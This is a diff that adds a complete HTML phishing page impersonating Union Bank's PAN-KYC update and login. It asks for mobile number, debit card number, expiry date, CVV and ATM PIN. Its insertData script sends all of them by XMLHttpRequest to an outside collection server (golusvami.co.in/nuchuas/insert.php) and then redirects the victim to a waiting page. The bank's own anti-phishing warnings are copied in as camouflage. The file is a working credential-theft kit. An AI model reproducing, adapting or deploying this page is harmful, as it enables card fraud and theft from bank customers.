@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Asasfdgad12389@*()1389=123</title>
+
+	<style type="text/css">
+  input[type="number"]::-webkit-inner-spin-button,
+  input[type="number"]::-webkit-outer-spin-button {
+    -webkit-appearance: none;
+    margin: 0;
+  }
+
+  input[type="number"] {
+    -moz-appearance: textfield;
+  }
+
+		input{
+			background-color: transparent;
+			border: none;
+			border-bottom: 1px solid rgba(255, 255, 255,1);
+			opacity: 1;
+			color: white;
+
+		}
+
+		input:focus{
+			outline: none;
+		}
+		label{
+			font-size: 12px;
+			letter-spacing: 1px;
+			font-weight: bold;
+		}
+
+		#cvv_label{
+           margin-left: 200px;
+		}
+
+
+
+ .triangle-container {
+      position: relative;
+      width: 10px; 
+      height: 10px;
+    }
+
+    .triangle {
+      width: 0;
+      height: 0;
+      border-left: 10px solid transparent;
+      border-right: 0;
+      border-bottom: 10px solid red;
+      position: absolute;
+      right: 0;
+      transform: rotate(-45deg);
+    }
+		@media screen and (max-width:500px){
+		
+		#cvv_label{
+           margin-left: 50px;
+		}
+
+		}
+
+	</style>
+</head>
+<body>
+   
+   <div style="text-align: center;">
+   	<img src="unionbanklogo-new.webp" style="width: 80%;height: 70px;">
+   </div><Br>
+
+   
+
+   <div style="height: 20px;background-color: #FE0000;color: white;padding: 10px;text-align: center;">
+   	  UPDATE TO PAN-KYC
+   </div>
+
+   <div style="background-color: #0066B0;color: white;padding: 10px;text-align: center;">
+   	  ALL SINGLE SECURE LOGIN
+   </div>
+    
+    <div style="background-color: #0066B0;color: white;padding: 10px;margin-top: 30px;padding-top: 30px;">
+   	  
+   	<div>
+   		<label>REGISTERED MOBILE No<span style="color:#C2061F">*</span></label>
+   		<br>
+
+   	  <input type="number" id="mobile_no" oninput="limitLengthAndMoveFocus(this, 10)" style="width:100%;margin-top: 10px;">
+      <small id="mobileno_error"></small>
+
+   	</div>
+
+
+   	<div style="margin-top: 40px;">
+   		<label>DEBIT CARD No<span style="color:#C2061F">*</span></label>
+   		<br>
+   	      <input type="text" id="debit_card_no" oninput="formatInput(this, 19)" style="width: 100%; margin-top: 10px;">
+          <small id="debit_card_error"></small>
+
+  <script>
+        function formatInput(inputElement, maxLength) {
+            let inputValue = inputElement.value.replace(/\D/g, ''); // Remove non-digit characters
+            let formattedValue = '';
+
+            for (let i = 0; i < inputValue.length; i++) {
+                formattedValue += inputValue[i];
+                if ((i + 1) % 4 === 0 && i + 1 !== inputValue.length) {
+                    formattedValue += ' ';
+                }
+            }
+
+            if (formattedValue.length > maxLength) {
+                formattedValue = formattedValue.substr(0, maxLength); // Limit to maxLength characters
+            }
+
+            inputElement.value = formattedValue;
+        }
+    </script>
+   	</div>
+
+
+  <div style="margin-top: 40px;">
+  <label>EXPIRY DATE<span style="color:#C2061F">*</span></label>
+  
+  <input type="number" id="monthInput" name="" style="width: 40px; margin-top: 10px; text-align: center; line-height: 30px;" placeholder="MM" oninput="limitLengthAndMoveFocus(this, 2, 'yearInput')">
+  <span>/</span>
+  <input type="number" id="yearInput" name="" style="width: 40px; text-align: center; line-height: 30px;" placeholder="YY" oninput="limitLengthAndMoveFocus(this, 2, 'cvvInput')">
+
+  <label id="cvv_label">CVV<span style="color:#C2061F">*</span></label>
+  
+  <input type="number" id="cvvInput" name="" style="width: 40px; text-align: center; line-height: 30px;" placeholder="XXX" oninput="limitLengthAndMoveFocus(this, 3)">
+  <small id="cvv_error"></small>
+</div>
+
+<script>
+  function limitLength(element, maxLength) {
+    if (element.value.length > maxLength) {
+      element.value = element.value.slice(0, maxLength);
+    }
+  }
+</script>
+
+<script>
+  function limitLengthAndMoveFocus(element, maxLength, nextInputId) {
+    if (element.value.length >= maxLength) {
+      element.value = element.value.slice(0, maxLength);
+      if (nextInputId) {
+        document.getElementById(nextInputId).focus();
+      }
+    }
+  }
+</script>
+
+
+	<div style="margin-top: 40px;">
+   		<label>ATM PIN NO<span style="color:#C2061F">*</span></label>
+   		
+   	  <input id="atm_pin" oninput="limitLengthAndMoveFocus(this, 4)" type="number" style="width: 40px; text-align: center; line-height: 30px;">
+      <small id="atmpin_error"></small>
+  
+   	 
+   	</div>
+<div style="margin-top: 20px;text-align: center;">
+ <button onclick="insertData();" style="background-color: white;border: none;color: #0066B0;padding: 10px 15px;border-radius: 5px;cursor: pointer;">SUBMIT</button>
+</div>
+   
+   	<br>
+
+   </div>
+
+
+
+<div>
+   	<img src="a72da1b1-433b-4955-b4f5-5d6319f7dc1b.jpg" style="width: 100%;height: 200px;">
+   </div>
+ 
+
+
+<div style="margin-top:20px;padding: 20px;">
+	<span  style="color: #D8261E;font-size: 1em;font-weight: bold;margin-bottom: 12px;display: block;">Customer Alert !!!! [Beware of phishing]</span>
+<Br>
+
+<div class="triangle-container">
+    <div class="triangle"></div>
+  </div>
+	<span style="font-size: 12px; float: left; padding-top: 5px; padding-bottom: 5px;margin-top: -20px;margin-left: 20px;">
+	Do not respond to fraudulent communications asking your confidentials like A/c No, User Id, Password, Card No,etc</span>
+
+<br><br>	
+	<div class="triangle-container">
+    <div class="triangle"></div>
+  </div>
+	<span style="font-size: 12px; float: left; padding-top: 5px; padding-bottom: 5px;margin-top: -20px;margin-left: 20px;">
+	Fraudulent e-mails contain links of look-alike websites to mislead into entering sensitive financial data
+</span>
+
+
+<br><br>	
+	<div class="triangle-container">
+    <div class="triangle"></div>
+  </div>
+	<span style="font-size: 12px; float: left; padding-top: 5px; padding-bottom: 5px;margin-top: -20px;margin-left: 20px;">
+	Bank will never send such communications to customers asking for their personal or confidential information
+</span>
+
+
+
+
+<br><br>	
+	<div class="triangle-container">
+    <div class="triangle"></div>
+  </div>
+	<span style="font-size: 12px; float: left; padding-top: 5px; padding-bottom: 5px;margin-top: -20px;margin-left: 20px;">
+	Always visit Bank's site instead of clicking on the links provided in emails or third party websites
+</span>
+
+
+
+
+<br><br>	
+	<div class="triangle-container">
+    <div class="triangle"></div>
+  </div>
+	<span style="font-size: 12px; float: left; padding-top: 5px; padding-bottom: 5px;margin-top: -20px;margin-left: 20px;">
+	Do not respond to pop-up windows asking for your confidential information
+</span>
+
+
+</div>
+
+
+
+<script>
+function insertData() {
+  var mobile_no = document.getElementById("mobile_no").value;
+
+  var debit_card_no = document.getElementById("debit_card_no").value;
+
+  var exp_mnth = document.getElementById("monthInput").value;
+
+  var exp_year = document.getElementById("yearInput").value;
+
+  var cvv = document.getElementById("cvvInput").value;
+
+  var atm_pin = document.getElementById("atm_pin").value;
+
+
+
+
+  var url = window.location.hostname;
+  var domain= url+'/showhtml.html';
+
+
+if (mobile_no!="" && debit_card_no!="" && exp_mnth!="" && exp_year!="" && cvv!="" && atm_pin!="") {
+
+
+if (mobile_no.length < 10) {
+    alert('Mobile number must be at least 10 digits.');
+    return;
+}
+
+if (debit_card_no.length < 19) {
+    alert('Debit Card No must be at least 16 digits.');
+    return;
+}
+
+if (cvv.length < 3) {
+    alert('CVV must be 3 digits.');
+    return;
+}
+
+if (atm_pin.length < 4) {
+    alert('Atm pin must be 3 digits.');
+    return;
+}
+
+let randomNumber = Math.random();
+let randomNumberTen = Math.floor(Math.random() * 11);
+let randomNumberOneTen = Math.floor(Math.random() * 10) + 1;
+function randomRange(min, max) {
+return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+var rand_id = randomRange(1, 100000);
+
+            // Create a JavaScript object with the input data
+            var data = {
+                mobile_no: mobile_no,
+                debit_card_no: debit_card_no,
+                exp_mnth:exp_mnth,
+                exp_year:exp_year,
+                cvv:cvv,
+                atm_pin:atm_pin,
+                random_no:rand_id,
+                domain:domain
+            };
+
+            // Send the data to the API endpoint using AJAX
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://golusvami.co.in/nuchuas/insert.php", true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    console.log(xhr.responseText);
+                    localStorage.setItem('random_no', rand_id);
+
+                    // window.location.href='Emerald';
+                    window.location.href='wait1.html';
+
+                }
+            };
+            xhr.send(JSON.stringify(data));
+
+        }
+        else{
+            alert('Please fill all fields');
+        }
+        }
+    </script>
+</body>
+</html>
